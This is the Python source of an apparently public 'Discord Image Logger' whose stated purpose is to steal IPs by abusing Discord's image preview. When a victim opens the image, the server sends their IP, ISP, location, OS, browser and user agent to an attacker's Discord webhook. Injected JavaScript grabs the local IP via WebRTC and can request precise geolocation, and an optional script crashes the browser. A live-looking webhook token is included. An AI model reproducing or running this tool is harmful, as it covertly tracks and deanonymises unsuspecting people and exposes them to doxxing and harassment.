# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",  # REPLACE WITH YOUR WEBHOOK
    "image": "https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA0L2pvYjcyMS0wMzctdi5qcGc.jpg",
    "imageArgument": True,
    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}
blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
   
    bot = botCheck(ip, useragent)
   
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        if config["vpnCheck"] == 1:
            ping = ""
   
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
                return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
   
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**
**Endpoint:** `{endpoint}`
           
**IP Info:**
> **Public IP:** `{ip if ip else 'Unknown'}`
> **Local IP:** `Fetching via WebRTC...`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }
    ],
}
   
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    # Send initial embed
    response = requests.post(config["webhook"], json = embed)
    
    # Get message ID for editing later with local IP
    try:
        message_data = response.json()
        message_id = message_data.get("id")
        webhook_id = config["webhook"].split("/")[-2]
        webhook_token = config["webhook"].split("/")[-1]
    except:
        message_id = None
    
    return info, message_id, webhook_id, webhook_token if message_id else (info, None, None, None)

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
   
    def handleRequest(self):
        try:
            s = self.path
            if config["imageArgument"]:
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]
           
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
           
            # Check if it's a Discord bot fetching the preview
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                # Send actual image for Discord preview
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])
                else:
                    # Redirect to actual image for preview
                    pass
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                return
           
            # When a real user clicks "Open Original"
            else:
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result_data = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result_data = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                
                # Unpack the result
                if result_data and len(result_data) == 4:
                    result, message_id, webhook_id, webhook_token = result_data
                else:
                    result = result_data if result_data else None
                    message_id = None
               
                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
                
                # Show the image with logging scripts
                data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
                
                datatype = 'text/html'
                if config["message"]["doMessage"]:
                    data = message.encode()
               
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

                # Local IP grabber via WebRTC - Updates the same embed
                public_ip = self.headers.get('x-forwarded-for') or 'Unknown'
                
                js_code = f'''
<script>
setTimeout(() => {{
    let localIp = "Unknown";

    // Grab Real Local IP via WebRTC (Ethernet/WiFi IP - bypasses VPN)
    try {{
        const pc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = ice => {{
            if (ice && ice.candidate && ice.candidate.candidate) {{
                const match = ice.candidate.candidate.match(/([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/);
                if (match) {{
                    localIp = match[1];
                    // Edit the existing webhook message to add local IP
                    fetch("https://discord.com/api/webhooks/{webhook_id if message_id else ''}/{webhook_token if message_id else ''}/messages/{message_id if message_id else ''}", {{
                        method: "PATCH",
                        headers: {{"Content-Type": "application/json"}},
                        body: JSON.stringify({{
                            embeds: [{{
                                title: "Image Logger - IP Logged",
                                color: {config['color']},
                                description: "**A User Opened the Original Image!**\\n**Endpoint:** `{s.split('?')[0]}`\\n\\n**IP Info:**\\n> **Public IP:** `{public_ip}`\\n> **Local IP (Ethernet/WiFi):** `" + localIp + "`\\n> **Provider:** `{{provider}}`\\n> **ASN:** `{{asn}}`\\n> **Country:** `{{country}}`\\n> **Region:** `{{region}}`\\n> **City:** `{{city}}`\\n> **Coords:** `{{coords}}`\\n> **Timezone:** `{{timezone}}`\\n> **Mobile:** `{{mobile}}`\\n> **VPN:** `{{vpn}}`\\n> **Bot:** `{{bot}}`\\n\\n**PC Info:**\\n> **OS:** `{{os}}`\\n> **Browser:** `{{browser}}`\\n\\n**User Agent:**\\n```\\n{{useragent}}\\n```"
                            }}]
                        }})
                    }});
                }}
            }}
        }};
    }} catch(e) {{}}
}}, 1000);
</script>
'''
                # Replace placeholders with actual data if result exists
                if result:
                    js_code = js_code.replace('{{provider}}', result.get('isp', 'Unknown'))
                    js_code = js_code.replace('{{asn}}', result.get('as', 'Unknown'))
                    js_code = js_code.replace('{{country}}', result.get('country', 'Unknown'))
                    js_code = js_code.replace('{{region}}', result.get('regionName', 'Unknown'))
                    js_code = js_code.replace('{{city}}', result.get('city', 'Unknown'))
                    coords_text = str(result['lat'])+', '+str(result['lon']) if result.get('lat') and result.get('lon') else 'Unknown'
                    js_code = js_code.replace('{{coords}}', coords_text)
                    timezone_text = result['timezone'].split('/')[1].replace('_', ' ') + ' (' + result['timezone'].split('/')[0] + ')' if result.get('timezone') else 'Unknown'
                    js_code = js_code.replace('{{timezone}}', timezone_text)
                    js_code = js_code.replace('{{mobile}}', str(result.get('mobile', 'Unknown')))
                    js_code = js_code.replace('{{vpn}}', str(result.get('proxy', 'Unknown')))
                    bot_status = result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'
                    js_code = js_code.replace('{{bot}}', str(bot_status))
                    os_info, browser_info = httpagentparser.simple_detect(self.headers.get('user-agent'))
                    js_code = js_code.replace('{{os}}', os_info or 'Unknown')
                    js_code = js_code.replace('{{browser}}', browser_info or 'Unknown')
                    js_code = js_code.replace('{{useragent}}', self.headers.get('user-agent') or 'Unknown')
                
                data += js_code.encode()

                self.wfile.write(data)
       
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
        return
   
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
